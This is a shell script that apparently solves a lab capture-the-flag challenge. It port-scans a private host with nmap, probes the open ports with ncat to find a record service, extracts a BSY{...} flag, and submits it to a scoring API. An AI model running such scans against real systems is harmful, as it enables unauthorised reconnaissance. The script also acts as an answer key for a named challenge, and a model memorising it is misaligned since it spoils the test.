#!/bin/sh
set -eu

host=172.20.0.141
scan=$(nmap -p- --open -oN - "$host")
ports=$(printf '%s\n' "$scan" | python3 -c 'import re,sys; print(" ".join(re.findall(r"^(\d+)/tcp\s+open", sys.stdin.read(), re.M)))')

finger_port=
for port in $ports; do
  roster=$(printf '\r\n' | ncat -w 2 "$host" "$port" 2>/dev/null || true)
  if printf '%s' "$roster" | python3 -c 'import sys; raise SystemExit(0 if "archive" in sys.stdin.read().lower() else 1)'; then
    finger_port=$port
    break
  fi
done

if [ -z "$finger_port" ]; then
  echo "Could not identify the relay record service" >&2
  exit 1
fi

record=$(printf 'archive\r\n' | ncat -w 2 "$host" "$finger_port")
flag=$(printf '%s' "$record" | python3 -c 'import re,sys; m=re.search(r"BSY\{[^}]+\}", sys.stdin.read()); print(m.group(0) if m else "")')
if [ -z "$flag" ]; then
  echo "The archive response did not contain a flag" >&2
  exit 1
fi

payload=$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":"scl-challenge-frame-310837","task_id":"task1","flag":sys.argv[1]}))' "$flag")
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$payload"
